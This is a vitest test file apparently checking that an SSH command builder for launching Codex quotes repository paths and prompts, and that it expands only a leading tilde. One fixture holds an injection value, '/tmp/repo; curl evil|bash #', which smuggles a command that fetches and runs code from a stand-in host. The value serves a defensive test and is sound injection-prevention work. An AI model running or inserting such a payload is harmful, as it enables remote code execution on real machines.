import { describe, expect, it } from 'vitest';
import { buildSshCodexRemoteCommand, expandLeadingTilde } from './routes';

describe('geordi-swarm SSH command composition', () => {
  it('quotes repo and codex paths so shell metacharacters are not emitted raw', () => {
    const remoteCommand = buildSshCodexRemoteCommand({
      repoPath: '/tmp/repo; curl evil|bash #',
      codexBin: '/Applications/Codex.app/Contents/Resources/codex',
      prompt: "ship it'",
    });

    expect(remoteCommand).not.toContain('cd /tmp/repo; curl evil|bash # &&');
    expect(remoteCommand).toContain("cd '/tmp/repo; curl evil|bash #'");
    expect(remoteCommand).toContain("'/Applications/Codex.app/Contents/Resources/codex' exec");
    expect(remoteCommand).toContain("'ship it'\\'''");
  });

  it('expands only a leading tilde in repo paths', () => {
    expect(expandLeadingTilde('~/Code/entity', '/Users/book')).toBe('/Users/book/Code/entity');
    expect(expandLeadingTilde('/tmp/~literal', '/Users/book')).toBe('/tmp/~literal');
  });
});
